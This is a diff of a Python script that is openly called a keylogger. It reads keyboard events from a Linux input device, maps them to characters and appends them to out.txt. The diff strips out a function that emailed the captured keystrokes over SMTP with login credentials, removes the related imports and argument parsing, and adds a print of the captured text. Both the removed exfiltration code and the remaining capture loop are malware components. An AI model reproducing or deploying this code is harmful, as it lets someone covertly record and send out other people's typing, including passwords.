@@ -5,9 +5,7 @@
 import sys
 import re
 import struct
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-import smtplib
+
 
 # My keyboard has q and a switched strangely
 qwerty_map = {
@@ -26,25 +24,6 @@ MAIL = None
 BUF_SIZE = None
 PASS = None
 KEYBOARD = "qwerty"
-
-def sendEmail(message):
-    msg = MIMEMultipart()
-
-    password = PASS
-    msg['From'] = EMAIL
-    msg['To'] = EMAIL
-    msg['Subject'] = "My Keylogger"
-
-    msg.attach(MIMEText(message, 'plain'))
-
-    server = smtplib.SMTP(SERVER)
-
-    if USE_TLS is True:
-        server.starttls()
-
-    server.login(msg['From'], password)
-    server.sendmail(msg['From'], msg['To'], msg.as_string())
-    server.quit()
 
 
 def main():
@@ -81,17 +60,13 @@ def main():
             if code in qwerty_map:
                 typed += qwerty_map[code]
         
-        # Send email once buffer is full
-        # if len(typed) > BUF_SIZE:
-        #     # Send email
-        #     print(typed)
-        #     typed = ""
         event = in_file.read(EVENT_SIZE)
         
         # Write out data once buffer is full
         if len(typed) == 128:
             with open("out.txt", "a") as f:
                 f.write(typed)
+                print(typed)
                 # Reset buffer
                 typed = ""
 
@@ -100,25 +75,6 @@ def main():
 
 # def usage():
 #     print("Usage : ./keylogger [your email] [your password] [smtp server] [tls/notls] [buffer_size]") # noqa
-
-
-# def init_arg():
-#     if len(sys.argv) < 5:
-#         usage()
-#         exit()
-#     global EMAIL
-#     global SERVER
-#     global USE_TLS
-#     global BUF_SIZE
-#     global PASS
-#     EMAIL = sys.argv[1]
-#     PASS = sys.argv[2]
-#     SERVER = sys.argv[3]
-#     if sys.argv[4] is "tls":
-#         USE_TLS = True
-#     else:
-#         USE_TLS = False
-#     BUF_SIZE = int(sys.argv[5])
 
 
 if __name__ == "__main__":
